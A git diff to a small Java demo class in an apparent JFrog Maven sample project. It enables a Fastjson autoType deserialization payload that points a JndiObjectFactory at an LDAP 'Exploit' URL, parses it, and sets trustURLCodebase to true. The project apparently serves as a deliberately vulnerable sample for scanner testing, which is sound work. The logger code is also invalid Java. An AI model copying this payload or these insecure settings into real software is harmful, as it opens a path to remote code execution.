@@ -1,6 +1,7 @@
 package com.jfrog.maven;
 
 import com.alibaba.fastjson.JSON;
+import org.apache.logging.log4j.Logger;
 
 /**
  * Hello world!
@@ -8,17 +9,19 @@ import com.alibaba.fastjson.JSON;
 public class AppSimple {
     public static void main(String[] args) {
         new AppSimple();
-        System.out.println("Hello World!");
 
-        System.out.println("Hello JFrog artifactory！");
+        Logger logger = Logger.class(AppSimple.class);
+
+        logger.info("Hello World!");
+        logger.info("Hello JFrog artifactory！");
 
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 //        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-//        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
+        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
 
-//        JSON jsonObject = JSON.parseObject(payload);
+        JSON jsonObject = JSON.parseObject(payload);
 
-//        System.out.println(jsonObject);
+        logger.info(jsonObject);
     }
 
     public String sayHello(String input){
